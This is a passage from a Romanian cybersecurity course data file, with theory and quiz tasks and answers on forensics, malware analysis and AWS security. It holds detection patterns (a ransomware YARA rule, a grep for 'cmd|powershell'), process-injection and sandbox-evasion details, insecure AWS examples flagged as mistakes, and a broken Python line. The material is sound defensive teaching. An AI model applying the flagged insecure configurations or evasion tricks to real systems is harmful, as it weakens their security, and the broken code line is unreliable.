        name: "Disk image hash verification",
        question: "De ce verifici hash-ul imaginii forensice cu hash-ul originalului?",
        options: [
          "E o formalitate",
          "Garanteaza ca imaginea e identica cu originalul (bit-by-bit) — dovedeste integritatea probei in instanta",
          "Pentru compresie mai buna",
          "Pentru a detecta virusuri"
        ],
        answer: "Garanteaza ca imaginea e identica cu originalul (bit-by-bit) — dovedeste integritatea probei in instanta",
        explanation: "md5sum /dev/sda trebuie sa fie identic cu md5sum imagine.img. Orice diferenta = imaginea e corupta sau a fost modificata.",
        difficulty: "easy"
      },
      {
        number: 13,
        name: "Process injection detection",
        question: "Care sunt indicatorii comuni de process injection in memory forensics?",
        options: [
          "Utilizare mare de RAM",
          "Regiuni de memorie cu permisiuni RWX (Read-Write-Execute) fara backing file, procese legitime cu DLL-uri suspecte, anomalii in arborele de procese",
          "Procese cu nume lungi",
          "Memorie fragmentata"
        ],
        answer: "Regiuni de memorie cu permisiuni RWX (Read-Write-Execute) fara backing file, procese legitime cu DLL-uri suspecte, anomalii in arborele de procese",
        explanation: "Code injection: shellcode injectat in notepad.exe = regiune RWX fara fisier PE asociat. malfind in Volatility detecteaza exact asta.",
        difficulty: "hard"
      },
      {
        number: 14,
        name: "Autopsy features",
        question: "Ce analizeaza automat Autopsy (forensics GUI) dintr-o imagine de disk?",
        options: [
          "Doar fisierele existente",
          "Fisiere sterse, browser history, email, documente, imagini, metadata, keyword search, hash-uri malware cunoscute",
          "Doar imaginile",
          "Doar log-urile sistem"
        ],
        answer: "Fisiere sterse, browser history, email, documente, imagini, metadata, keyword search, hash-uri malware cunoscute",
        explanation: "Autopsy e un frontend GUI pentru Sleuth Kit. Analizeaza automat: web artifacts (history, cookies, downloads), recent documents, installed programs, EXIF.",
        difficulty: "medium"
      },
      {
        number: 15,
        name: "RFC 3227 order",
        question: "Conform RFC 3227, in ce ordine ar trebui colectate dovezile digitale?",
        options: [
          "Disk > RAM > Retea",
          "Cel mai volatil primul: Registri CPU > RAM > Stare retea > Procese > Disk > Backup-uri offline",
          "Alfabetic dupa tip",
          "Cel mai usor de colectat primul"
        ],
        answer: "Cel mai volatil primul: Registri CPU > RAM > Stare retea > Procese > Disk > Backup-uri offline",
        explanation: "RFC 3227 (Guidelines for Evidence Collection and Archiving): volatilitatea descrescanda. Registri CPU se pierd in microsecunde, backup-urile offline persista zile.",
        difficulty: "medium"
      }
    ]
  },
  {
    slug: "malware-analysis",
    title: "25. Malware Analysis",
    order: 25,
    theory: [
      {
        order: 1,
        title: "Tipuri de malware si Static Analysis",
        content: "**Malware** (Malicious Software) = orice software creat cu intentie malitioasa.\n\n**Tipuri principale:**\n- **Virus** — se ataseaza la fisiere legitime, se raspandeste la executie\n- **Worm** — se raspandeste autonom prin retea (fara fisier gazda)\n- **Trojan** — se mascheaza ca software legitim\n- **Ransomware** — cripteaza fisierele, cere rascumparare\n- **Spyware/Keylogger** — fura date, inregistreaza tastatura\n- **Rootkit** — ascunde prezenta in sistem\n- **Botnet** — retea de calculatoare compromise controlate de C2\n\n**Static Analysis** = analiza fara a executa malware-ul.\n\n```bash\n# 1. Hash-uri si verificare VirusTotal:\nmd5sum malware.exe\nsha256sum malware.exe\n# Cauta hash-ul pe virustotal.com\n\n# 2. Strings — cauta text lizibil:\nstrings malware.exe\nstrings -l 8 malware.exe | grep -iE 'http|ftp|cmd|powershell|registry'\nstrings -el malware.exe  # Unicode strings\n\n# 3. File type si metadata:\nfile malware.exe         # tip fisier real (nu extensie)\nexiftool malware.exe     # metadata PE: compil time, original filename\n\n# 4. PE (Portable Executable) analysis:\npefile malware.exe       # Python pefile library\npe-bear, PEStudio (GUI)  # tool-uri dedicate\n\n# Sectiunile PE importante:\n# .text — cod executabil\n# .data — date initializate\n# .rsrc — resurse (icons, strings, version info)\n# Sectiuni cu entropy > 7.0 = probabil criptat/packed!\n\n# 5. Imports analiza:\nobjdump -d malware.exe   # disassembly\nnm -D malware.so        # symboluri Linux\n\n# Red flags in imports:\n# VirtualAlloc + WriteProcessMemory + CreateRemoteThread = process injection\n# CreateService = persistenta\n# RegSetValueEx = modificare registry\n# WinExec/ShellExecute = executie comenzi\n# WSAConnect + connect + send/recv = comunicare retea (C2)\n```\n\n**Interview tip:** Entropy ridicata (> 7.0) intr-o sectiune PE = probabil packed/encrypted — malware ascunde codul real. Tool: DiE (Detect It Easy) detecteaza packere."
      },
      {
        order: 2,
        title: "Dynamic Analysis — Sandbox si monitorizare comportament",
        content: "**Dynamic Analysis** = rulezi malware-ul intr-un mediu controlat si monitorizezi comportamentul.\n\n**Sandbox-uri online:**\n- **ANY.RUN** — interactiv, vizualizare real-time\n- **Cuckoo Sandbox** — self-hosted, open-source\n- **VirusTotal** — analiza statica + dynamic (>70 AV engines)\n- **Joe Sandbox** — comercial, rapoarte detaliate\n- **Tria.ge** — rapid, gratuit pentru cercetare\n\n```bash\n# Cuckoo Sandbox — setup si rulare:\ncuckoo submit malware.exe\ncuckoo submit --url https://suspicious-site.com\n\n# Cuckoo raporteaza automat:\n# - API calls (system calls)\n# - Fisiere create/modificate/sterse\n# - Registry changes\n# - Conexiuni retea (IP, domenii, DNS queries)\n# - Screenshot-uri la intervale\n# - Procese create\n\n# Monitorizare manuala (Windows):\n# Process Monitor (ProcMon) — Sysinternals:\n# Filtrezi dupa PID al malware-ului:\n# - Registry changes (RegSetValueEx, RegCreateKey)\n# - File system operations (CreateFile, WriteFile)\n# - Network operations\n\n# Process Hacker / Process Explorer:\n# - Dependinte DLL\n# - Memory maps\n# - Handles deschise\n# - Conexiuni retea per proces\n\n# Wireshark — captura retea:\nwireshark -i eth0 -w capture.pcap &\n# Ruleaza malware\n# Ctrl+C pentru stop\ntshark -r capture.pcap -Y \"dns\" -T fields -e dns.qry.name | sort -u\n# Extragi domenii DNS contactate\n\n# Regshot — snapshot registry+filesystem:\n# 1st shot inainte\n# Ruleaza malware\n# 2nd shot dupa\n# Compare → afiseaza toate schimbarile\n```\n\n**Interview tip:** Anti-analysis techniques: malware verifica daca ruleaza in VM (CPUID, registry keys VMware), intr-un debugger (IsDebuggerPresent), intr-un sandbox (prea rapid, prea putine procese)."
      },
      {
        order: 3,
        title: "Indicators of Compromise (IoC) si YARA rules",
        content: "**IoC** = artefacte observabile care indica o compromitere.\n\n**Tipuri de IoC:**\n```\nNivel atomic (usor de schimbat de atacator):\n- Hash-uri MD5/SHA256 ale fisierelor malware\n- IP-uri de C2 (Command & Control)\n- Domenii malitioase\n- URL-uri malitioase\n\nNivel computed:\n- Mutex names (malware creeaza mutex unic sa nu se instaleze de 2 ori)\n- Registry keys de persistenta\n- Filenames/paths specifice\n- User-Agent strings neobisnuiti\n\nNivel behavioral (greu de schimbat):\n- Tehnici de atac (TTP — Tactics, Techniques, Procedures)\n- Patterns de comunicare C2\n- Metode de evasion\n```\n\n**YARA Rules** — pattern matching pentru detectare malware:\n```yara\n// yara rule pentru detectare ransomware generic:\nrule Ransomware_Generic {\n    meta:\n        description = \"Detecteaza comportament caracteristic ransomware\"\n        author = \"Security Team\"\n        date = \"2025-05-16\"\n        severity = \"critical\"\n\n    strings:\n        // Strings comune ransomware:\n        $s1 = \"Your files have been encrypted\" nocase\n        $s2 = \"Bitcoin\" nocase\n        $s3 = \".onion\" nocase\n        $s4 = \"README\" nocase\n\n        // API imports tipice:\n        $api1 = \"CryptEncrypt\"\n        $api2 = \"FindFirstFile\"\n        $api3 = \"DeleteShadowCopies\" nocase\n\n        // Extension-uri tipice ransomware:\n        $ext1 = \".locked\"\n        $ext2 = \".encrypted\"\n        $ext3 = \".enc\"\n\n    condition:\n        uint16(0) == 0x5A4D  // MZ header (Windows PE)\n        and (2 of ($s*))\n        and (1 of ($api*))\n}\n\n// Rulare YARA:\nyara ransomware_rule.yar /path/to/suspicious/\nyara -r rule.yar /           // recursive\nyara -s rule.yar sample.exe  // afiseaza string matches\n```\n\n**MITRE ATT&CK Framework:**\n- Taxonomie standardizata de TTP\n- T1059: Command and Scripting Interpreter\n- T1003: OS Credential Dumping\n- T1071: Application Layer Protocol (C2)\n\n**Interview tip:** Pyramid of Pain (David Bianco): hash-uri = usor de schimbat de atacator. TTP-uri = greu de schimbat — detectia TTP-urilor e mult mai valoroasa."
      },
      {
        order: 4,
        title: "Reverse Engineering si Malware Families",
        content: "**Reverse Engineering** = intelegerea codului binar fara cod sursa.\n\n**Tool-uri principale:**\n```\nGhidra (NSA, gratuit) — disassembler + decompiler\nIDA Pro (comercial, standard industrie) — disassembler\nx64dbg / OllyDbg — debugger Windows\nRadare2 — gratuit, CLI\n```\n\n```python\n# Analiza rapida Python cu pefile:\nimport pefile\nimport hashlib\n\ndef analizeaza_pe(path):\n    cu hash = hashlib.sha256(open(path,'rb').read()).hexdigest()\n    print(f\"SHA256: {hash}\")\n\n    pe = pefile.PE(path)\n\n    print(f\"Timestamp: {pe.FILE_HEADER.TimeDateStamp}\")\n    print(f\"Subsystem: {pe.OPTIONAL_HEADER.Subsystem}\")\n\n    print(\"\\nImport Table (API calls):\")\n    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):\n        for dll in pe.DIRECTORY_ENTRY_IMPORT:\n            print(f\"  {dll.dll.decode()}:\")\n            for func in dll.imports[:5]:  # primele 5\n                if func.name:\n                    print(f\"    - {func.name.decode()}\")\n\n    print(\"\\nSectiuni:\")\n    for section in pe.sections:\n        entropy = section.get_entropy()\n        print(f\"  {section.Name.decode().strip()}: entropy={entropy:.2f}\")\n        if entropy > 7.0:\n            print(\"    *** HIGH ENTROPY — probabil packed! ***\")\n\nanalizeaza_pe('sample.exe')\n```\n\n**Familii malware celebre:**\n- **WannaCry** (2017) — ransomware + worm, EternalBlue exploit (MS17-010)\n- **Mirai** (2016) — botnet IoT, DDoS record (Dyn DNS, >1Tbps)\n- **Emotet** — trojan bancar → malware-as-a-service\n- **Stuxnet** — cyberweapon, centrifuge Natanz Iran\n- **NotPetya** (2017) — wiper mascat ca ransomware, daune >10 miliarde USD\n\n**Interview tip:** WannaCry si EternalBlue sunt esentiale de stiut. NSA a dezvoltat EternalBlue, a fost furat de Shadow Brokers si folosit in cel mai devastator atac ransomware din istorie."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "Static vs Dynamic analysis",
        question: "Care e avantajul static analysis fata de dynamic analysis in malware analysis?",
        options: [
          "Static e mai rapid mereu",
          "Static nu executa malware-ul — fara risc de infectare, analizezi offline si in siguranta",
          "Static e mai precis",
          "Static detecteaza mai mult"
        ],
        answer: "Static nu executa malware-ul — fara risc de infectare, analizezi offline si in siguranta",
        explanation: "Dynamic analysis risca infectarea sistemului si poate fi evazata (malware detecteaza sandbox). Static analiza codul fara a-l rula — mai sigur dar mai complex.",
        difficulty: "medium"
      },
      {
        number: 2,
        name: "High entropy sections",
        question: "Ce indica o sectiune PE cu entropy > 7.0?",
        options: [
          "Fisier corupt",
          "Sectiunea este probabil criptata sau comprimata (packed) — malware ascunde codul real",
          "Virus cunoscut",
          "Sectiune sistem"
        ],
        answer: "Sectiunea este probabil criptata sau comprimata (packed) — malware ascunde codul real",
        explanation: "Entropy maxima = 8.0 (date complet aleatoare). > 7.0 = probabil packed/encrypted. Packere: UPX, MPRESS, custom. Dezavorizeaza analiza statica.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "YARA rule writing",
        question: "Scrie o regula YARA simpla care detecteaza fisiere PE Windows cu stringul 'C2_SERVER' si apelul API 'CreateRemoteThread'.",
        type: "coding",
        language: "yara",
        starterCode: "// Regula YARA pentru detectare malware cu process injection\nrule Malware_Process_Injection {\n    meta:\n        description = \"Detecteaza potential process injection\"\n    strings:\n        // adauga pattern pentru string C2_SERVER si API CreateRemoteThread\n    condition:\n        // fisier PE + ambele strings prezente\n}",
        options: [],
        answer: "",
        explanation: "strings: $s1 = \"C2_SERVER\" $api1 = \"CreateRemoteThread\" condition: uint16(0) == 0x5A4D and $s1 and $api1",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 4,
        name: "Pyramid of Pain",
        question: "Conform Pyramid of Pain (David Bianco), ce tip de IoC e CEL MAI VALOROS de detectat?",
        options: [
          "Hash-uri MD5 ale fisierelor malware",
          "TTP-uri (Tactics, Techniques, Procedures) — greu de schimbat de atacator, detectia cauzeaza durere maxima atacatorului",
          "IP-urile de C2",
          "Domain names"
        ],
        answer: "TTP-uri (Tactics, Techniques, Procedures) — greu de schimbat de atacator, detectia cauzeaza durere maxima atacatorului",
        explanation: "Hash-uri: atacatorul schimba un bit si hash-ul e diferit. TTP-uri: comportamentul de atac e greu de schimbat radical — detectia la nivel TTP e durabila.",
        difficulty: "hard"
      },
      {
        number: 5,
        name: "WannaCry vector",
        question: "Ce vulnerabilitate a exploatat WannaCry pentru raspandire automata in retea?",
        options: [
          "SQL Injection",
          "EternalBlue (MS17-010) — vulnerabilitate SMBv1 Windows dezvoltata de NSA si publicata de Shadow Brokers",
          "Log4Shell",
          "Heartbleed"
        ],
        answer: "EternalBlue (MS17-010) — vulnerabilitate SMBv1 Windows dezvoltata de NSA si publicata de Shadow Brokers",
        explanation: "WannaCry (mai 2017): EternalBlue exploita SMBv1, infecta 230.000 sisteme in 150 tari in 24 ore. UK NHS, FedEx, Telefonica afectate masiv.",
        difficulty: "medium"
      },
      {
        number: 6,
        name: "Strings command analysis",
        question: "Scrie comanda strings pentru a extrage URL-uri si IP-uri dintr-un fisier suspect, filtrare cu grep.",
        type: "coding",
        language: "bash",
        starterCode: "# Extrage stringuri de minim 8 caractere din malware.exe\n# Filtreaza: linii cu http, https, ftp sau IP pattern (x.x.x.x)\n# Salveaza in urls_and_ips.txt\n# Hint: strings -l 8, grep -E cu pattern regex",
        options: [],
        answer: "",
        explanation: "strings -l 8 malware.exe | grep -E '(https?://|ftp://|[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})' > urls_and_ips.txt",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 7,
        name: "C2 communication",
        question: "Ce este un C2 (Command and Control) server in contextul malware?",
        options: [
          "Un server de backup",
          "Serverul atacatorului catre care malware-ul se conecteaza pentru a primi comenzi si a exfiltra date",
          "Un server antivirus",
          "Un proxy web"
        ],
        answer: "Serverul atacatorului catre care malware-ul se conecteaza pentru a primi comenzi si a exfiltra date",
        explanation: "C2 (C&C): malware-ul (agent) se conecteaza periodic la serverul atacatorului (C2), primeste comenzi (download/upload/execute), raporteaza date furate.",
        difficulty: "easy"
      },
      {
        number: 8,
        name: "Anti-analysis techniques",
        question: "Cum detecteaza malware-ul ca ruleaza intr-un sandbox sau VM si ce face?",
        options: [
          "Nu poate detecta",
          "Verifica: CPUID hypervisor bit, registry keys VMware/VBox, numar procese, timing attacks, interactiune utilizator — daca detecteaza: nu ruleaza sau se sterge",
          "Citeste log-uri",
          "Verifica conexiunea internet"
        ],
        answer: "Verifica: CPUID hypervisor bit, registry keys VMware/VBox, numar procese, timing attacks, interactiune utilizator — daca detecteaza: nu ruleaza sau se sterge",
        explanation: "Evasion: CPUID bit 31 in ECX = hypervisor present. < 50 procese rulante = probabil sandbox. Mouse nu s-a miscat = sandbox fara interactiune umana.",
        difficulty: "hard"
      },
      {
        number: 9,
        name: "pefile analysis",
        question: "Scrie un script Python cu pefile care extrage lista de DLL-uri importate dintr-un executabil Windows.",
        type: "coding",
        language: "python",
        starterCode: "import pefile\n\ndef get_imports(filepath):\n    pe = pefile.PE(filepath)\n    \n    # verifica daca exista DIRECTORY_ENTRY_IMPORT\n    # extrage si afiseaza: DLL name -> list of function names\n    pass\n\nget_imports('sample.exe')",
        options: [],
        answer: "",
        explanation: "if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'): for dll in pe.DIRECTORY_ENTRY_IMPORT: print(dll.dll.decode()); [print('  '+f.name.decode()) for f in dll.imports if f.name]",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 10,
        name: "Mutex malware",
        question: "De ce creeaza malware-ul un mutex unic la instalare?",
        options: [
          "Pentru performanta",
          "Previne instalarea multipla pe acelasi sistem — daca mutex-ul exista, malware-ul stie ca e deja instalat si nu se reinstaleaza",
          "Pentru comunicare cu C2",
          "Pentru escaladare privilegii"
        ],
        answer: "Previne instalarea multipla pe acelasi sistem — daca mutex-ul exista, malware-ul stie ca e deja instalat si nu se reinstaleaza",
        explanation: "Mutex name e un IoC valoros (mai persistent decat hash). Exemplu: Mirai folosea mutex '/var/run/mirai.pid'. Detectia mutex-ului = detectia malware-ului.",
        difficulty: "medium"
      },
      {
        number: 11,
        name: "NotPetya vs ransomware",
        question: "De ce NotPetya (2017) e clasificat ca wiper (arma cibernetica) si nu ransomware?",
        options: [
          "Nu cerea rascumparare",
          "Nu putea decripta fisierele chiar daca platesti — distrugerea datelor era scopul real, nu banii",
          "Nu afecta Windows",
          "Nu se raspandea prin retea"
        ],
        answer: "Nu putea decripta fisierele chiar daca platesti — distrugerea datelor era scopul real, nu banii",
        explanation: "NotPetya: MBR suprascris cu cod distructiv, cheia de decriptare nu era salvata nicaieri. Mascat ca ransomware dar era cyberweapon targetat la Ucraina. Daune: >10 miliarde USD.",
        difficulty: "hard"
      },
      {
        number: 12,
        name: "MITRE ATT&CK",
        question: "La ce serveste MITRE ATT&CK Framework in context de malware analysis si threat intelligence?",
        options: [
          "Baza de date de vulnerabilitati",
          "Taxonomie standardizata de TTP-uri (tehnici, tactici, proceduri) ale atacatorilor — permite comunicare comuna si detectie bazata pe comportament",
          "Tool de scanare",
          "Framework de coding"
        ],
        answer: "Taxonomie standardizata de TTP-uri (tehnici, tactici, proceduri) ale atacatorilor — permite comunicare comuna si detectie bazata pe comportament",
        explanation: "ATT&CK: 14 tactici (Initial Access, Execution, Persistence...) + sute de tehnici. T1003 = Credential Dumping. Permite maparea malware-ului la TTP-uri cunoscute.",
        difficulty: "medium"
      },
      {
        number: 13,
        name: "Cuckoo sandbox",
        question: "Scrie comanda Cuckoo pentru a analiza un fisier suspect si a genera raport JSON.",
        type: "coding",
        language: "bash",
        starterCode: "# Submite malware.exe pentru analiza dinamica in Cuckoo\n# Genereaza raport in format JSON\n# Timeout: 120 secunde\n# Hint: cuckoo submit",
        options: [],
        answer: "",
        explanation: "cuckoo submit --timeout 120 malware.exe; # sau: curl -F file=@malware.exe http://localhost:8090/tasks/create/file",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 14,
        name: "Process injection APIs",
        question: "Ce combinatie de API-uri Windows indica process injection in analiza importurilor PE?",
        options: [
          "CreateFile + ReadFile + CloseHandle",
          "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — aloca memorie in alt proces, scrie cod, creeaza thread",
          "RegOpenKey + RegSetValue",
          "WSASocket + connect + send"
        ],
        answer: "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — aloca memorie in alt proces, scrie cod, creeaza thread",
        explanation: "Classic DLL injection / shellcode injection: VirtualAllocEx aloca spatiu in procesul victima, WriteProcessMemory scrie codul, CreateRemoteThread executa codul injectat.",
        difficulty: "hard"
      },
      {
        number: 15,
        name: "VirusTotal analysis",
        question: "Ce limitare importanta are VirusTotal in analiza malware si cum o compensezi?",
        options: [
          "Nu analizeaza PDF-uri",
          "Submisiile sunt publice si vazute de atacatori — malware nou (zero-day) poate fi nedetectat; compensezi cu sandbox privat si analiza manuala",
          "E prea lent",
          "Nu suporta fisiere mari"
        ],
        answer: "Submisiile sunt publice si vazute de atacatori — malware nou (zero-day) poate fi nedetectat; compensezi cu sandbox privat si analiza manuala",
        explanation: "Daca submiti un sample confidential pe VT, atacatorul poate vedea ca l-ai detectat si poate modifica malware-ul. Plus: AV signatures = detectie retroactiva, nu predictiva.",
        difficulty: "hard"
      }
    ]
  },
  {
    slug: "cloud-security",
    title: "26. Cloud Security",
    order: 26,
    theory: [
      {
        order: 1,
        title: "AWS IAM — Identity and Access Management",
        content: "**IAM** e fundamentul securitatii AWS — controleaza cine poate face ce pe ce resurse.\n\n**Concepte cheie:**\n```\nUser  — persoana/aplicatie cu credentiale permanente\nGroup — colectie de useri cu aceleasi permisiuni\nRole  — identitate temporara, asumata de servicii/useri\nPolicy — document JSON care defineste permisiunile\n```\n\n```json\n// Policy exemple:\n\n// Policy ReadOnly S3 pentru un bucket specific:\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Action\": [\"s3:GetObject\", \"s3:ListBucket\"],\n    \"Resource\": [\n      \"arn:aws:s3:::my-bucket\",\n      \"arn:aws:s3:::my-bucket/*\"\n    ]\n  }]\n}\n\n// Policy Deny exfiltration (SCP — Service Control Policy):\n{\n  \"Effect\": \"Deny\",\n  \"Action\": [\"s3:GetObject\"],\n  \"Resource\": \"*\",\n  \"Condition\": {\n    \"StringNotEquals\": {\n      \"aws:RequestedRegion\": \"eu-west-1\"\n    }\n  }\n}\n```\n\n```bash\n# CLI AWS — best practices:\n# Listeaza roluri:\naws iam list-roles --output table\n\n# Verifica ce poate face un user:\naws iam simulate-principal-policy \\\n    --policy-source-arn arn:aws:iam::123456789:user/dev \\\n    --action-names s3:DeleteBucket\n\n# Rotatie chei access:\naws iam create-access-key --user-name developer\naws iam delete-access-key --access-key-id OLD_KEY_ID --user-name developer\n\n# Activare MFA pentru root account:\n# Console → IAM → Security credentials → MFA\n# OBLIGATORIU pentru root account!\n```\n\n**Interview tip:** Principiul Least Privilege: da numai permisiunile strict necesare. Niciodata 'Action: *' pe 'Resource: *' in productie = acces total!"
      },
      {
        order: 2,
        title: "Shared Responsibility Model si S3 Bucket Misconfigurations",
        content: "**Shared Responsibility Model** = AWS si clientul impart responsabilitatea securitatii.\n\n```\nAWS responsabil pentru:\n- Securitatea FIZICA a datacenter-elor\n- Hypervisor, networking\n- Hardware, faciliti\n- \"Security OF the cloud\"\n\nClientul responsabil pentru:\n- IAM (cine are acces)\n- Configuratia serviciilor (Security Groups, S3 policies)\n- Criptarea datelor\n- Configuratia OS pe EC2\n- \"Security IN the cloud\"\n```\n\n**S3 Bucket Misconfigurations** = categoria #1 de breach-uri cloud:\n\n```bash\n# ❌ Public read access (CATASTROFA):\naws s3api put-bucket-acl --bucket my-bucket --acl public-read\n# Oricine poate lista si descarca TOATE fisierele!\n\n# Exemple reale de breaches prin S3 public:\n# - Capital One (2019): 100M+ date clienti, $80M amenda\n# - GoDaddy: cod sursa expus\n# - NSA: fisiere clasificate! (2017)\n\n# ✅ Blocheaza accesul public (obligatoriu in productie):\naws s3api put-public-access-block \\\n    --bucket my-bucket \\\n    --public-access-block-configuration \\\n    BlockPublicAcls=true,IgnorePublicAcls=true,\\\n    BlockPublicPolicy=true,RestrictPublicBuckets=true\n\n# ✅ Audit automat cu AWS Config:\naws configservice put-config-rule --config-rule \\\n    '{\"ConfigRuleName\":\"s3-bucket-public-read-prohibited\",\n      \"Source\":{\"Owner\":\"AWS\",\n      \"SourceIdentifier\":\"S3_BUCKET_PUBLIC_READ_PROHIBITED\"}}'\n\n# ✅ Criptare la repaus:\naws s3api put-bucket-encryption --bucket my-bucket \\\n    --server-side-encryption-configuration \\\n    '{\"Rules\":[{\"ApplyServerSideEncryptionByDefault\":{\"SSEAlgorithm\":\"aws:kms\"}}]}'\n\n# Tool-uri audit S3:\nprowler -c s3_bucket_public_access          # compliance check\nscout2 --services s3                         # audit complet\n```\n\n**Interview tip:** Block Public Access (4 setari) e obligatoriu. AWS a facut-o default din 2023 pentru buckets noi, dar buckets vechi pot fi publice!"
      },
      {
        order: 3,
        title: "Secrets Management — nu lasa credentialele in cod",
        content: "**Secrets in cod** = una dintre cele mai frecvente vulnerabilitati cloud.\n\n```bash\n# Detectie secrete in cod cu trufflehog:\ntrufflehog git https://github.com/org/repo --only-verified\n# Cauta chei AWS, tokens GitHub, parole hard-coded\n\n# gitleaks:\ngitleaks detect --source . --verbose\ngitleaks detect --source . -f json -r report.json\n\n# git-secrets (AWS):\ngit secrets --install    # instalare hooks\ngit secrets --register-aws  # pattern-uri AWS\ngit secrets --scan       # scan branch curent\n\n# Daca ai publicat o cheie AWS din greseala:\n# 1. Revoca IMEDIAT cheia din IAM\n# 2. Verifica CloudTrail pentru utilizare neautorizata\n# 3. Creeaza cheie noua\n# 4. Considera CA bucket-ul/resursele sunt compromise\n```\n\n**AWS Secrets Manager + Parameter Store:**\n```python\nimport boto3\n\n# Citire secret din Secrets Manager:\ndef get_secret(secret_name):\n    client = boto3.client('secretsmanager')\n    response = client.get_secret_value(SecretId=secret_name)\n    return response['SecretString']\n\n# Utilizare in aplicatie:\ndb_password = get_secret('prod/myapp/db-password')\n# Niciodata in .env sau in cod sursa!\n\n# Parameter Store (mai ieftin, pentru config non-secret):\nssm = boto3.client('ssm')\nresponse = ssm.get_parameter(\n    Name='/prod/myapp/db-url',\n    WithDecryption=True  # pentru SecureString\n)\ndb_url = response['Parameter']['Value']\n```\n\n**HashiCorp Vault** — secrets management self-hosted:\n```bash\nvault kv put secret/myapp/db password=\"super-secret\"\nvault kv get secret/myapp/db\nvault token create -ttl=1h -policy=myapp  # token cu expirare\n```\n\n**Interview tip:** Environment variables (.env) nu sunt o solutie sigura in productie — sunt vizibile in logs si procese. Secrets Manager + rotatie automata = standard."
      },
      {
        order: 4,
        title: "Security Groups, VPC si Cloud Security Posture Management",
        content: "**Security Groups** = firewall virtual pentru EC2 — controleaza traficul inbound/outbound.\n\n```bash\n# ❌ Greseala clasica — SSH deschis la toti:\naws ec2 authorize-security-group-ingress \\\n    --group-id sg-xxx \\\n    --protocol tcp --port 22 --cidr 0.0.0.0/0\n# Intreaga internet poate incerca sa se conecteze SSH!\n\n# ✅ SSH restrictionat la IP-ul tau:\naws ec2 authorize-security-group-ingress \\\n    --group-id sg-xxx \\\n    --protocol tcp --port 22 --cidr 203.0.113.10/32\n\n# ✅ Sau prin Bastion Host (jump server):\n# Internet → Bastion (port 22) → Private EC2 (port 22 doar de la bastion)\n\n# VPC Best Practices:\n# Subnets publice: load balancers, bastion hosts\n# Subnets private: aplicatii, baze de date (fara internet direct)\n# NAT Gateway: trafic outbound din subnets private\n\n# AWS Config Rules pentru posture management:\naws configservice describe-config-rules --output table\n\n# Prowler — CSPM open-source:\nprowler aws --checks s3_bucket_public_access,\\\n    iam_root_mfa_enabled,\\\n    ec2_securitygroup_allow_ingress_from_internet_to_port_22\n\n# AWS Security Hub — agregator:\n# CIS AWS Foundations Benchmark\n# AWS Foundational Security Best Practices\n# PCI DSS, SOC2 controls\n\n# CloudTrail — audit log:\naws cloudtrail lookup-events \\\n    --lookup-attributes AttributeKey=EventName,AttributeValue=DeleteBucket\n# Toate actiunile API sunt loggate in CloudTrail!\n```\n\n**Interview tip:** CloudTrail trebuie activat in TOATE regiunile (nu doar us-east-1). Fara CloudTrail nu poti face incident response in AWS. Cost: ~2$/100k API calls."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "IAM Least Privilege",
        question: "Ce inseamna Principiul Least Privilege in AWS IAM?",
        options: [
          "Toti userii au acces admin",
          "Fiecare identitate primeste numai permisiunile strict necesare pentru sarcina sa — nimic mai mult",
          "Rotatie de chei lunara",
          "MFA obligatoriu"
        ],
        answer: "Fiecare identitate primeste numai permisiunile strict necesare pentru sarcina sa — nimic mai mult",
        explanation: "Least Privilege: un lambda care citeste din S3 primeste s3:GetObject, nu s3:*. Limiteaza blast radius in caz de compromitere.",
        difficulty: "easy"
      },
      {
        number: 2,
        name: "Shared Responsibility",
        question: "Daca un S3 bucket este configurat public accidental, cine e responsabil conform Shared Responsibility Model?",
        options: [
          "AWS — nu a blocat configuratia",
          "Clientul — configuratia serviciilor e responsabilitatea clientului (Security IN the cloud)",
          "Impartit 50/50",
          "Nimeni — e o limitare tehnica"
        ],
        answer: "Clientul — configuratia serviciilor e responsabilitatea clientului (Security IN the cloud)",
        explanation: "AWS asigura infrastructura. Clientul configureaza corect serviciile: S3 policies, Security Groups, IAM. Capital One a platit $80M amenda pentru S3 public.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "S3 public block",
        question: "Scrie comanda AWS CLI pentru a bloca complet accesul public la un S3 bucket (toate cele 4 setari).",
        type: "coding",
        language: "bash",
        starterCode: "# Bucket: my-production-bucket\n# Blocheaza: BlockPublicAcls, IgnorePublicAcls,\n#            BlockPublicPolicy, RestrictPublicBuckets\n# Hint: aws s3api put-public-access-block",
        options: [],
        answer: "",
        explanation: "aws s3api put-public-access-block --bucket my-production-bucket --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 4,
        name: "IAM Role vs User",
        question: "Cand folosesti un IAM Role in loc de IAM User pentru o aplicatie pe EC2?",
        options: [
          "Rolurile sunt mai lente",
          "Rolul ofera credentiale temporare rotite automat — aplicatia nu stocheaza credentiale permanente (mai sigur)",
          "Userii sunt mai usor de gestionat",
          "Nu exista diferenta practica"
        ],
        answer: "Rolul ofera credentiale temporare rotite automat — aplicatia nu stocheaza credentiale permanente (mai sigur)",
        explanation: "IAM Role pe EC2: SDK preia automat credentiale din IMDS (access key, secret key, session token rotite la 1h). Fara credentiale hard-codate!",
        difficulty: "medium"
      },
      {
        number: 5,
        name: "trufflehog secrets scanning",
        question: "Scrie comanda trufflehog pentru a scana un repository GitHub pentru secrete verificate.",
        type: "coding",
        language: "bash",
        starterCode: "# Scaneaza https://github.com/myorg/myrepo\n# Afiseaza doar secretele verificate (real, nu false positives)\n# Hint: trufflehog git <url> --only-verified",
        options: [],
        answer: "",
        explanation: "trufflehog git https://github.com/myorg/myrepo --only-verified",
        difficulty: "easy",
        expectedOutput: ""
      },
      {
        number: 6,
        name: "CloudTrail purpose",
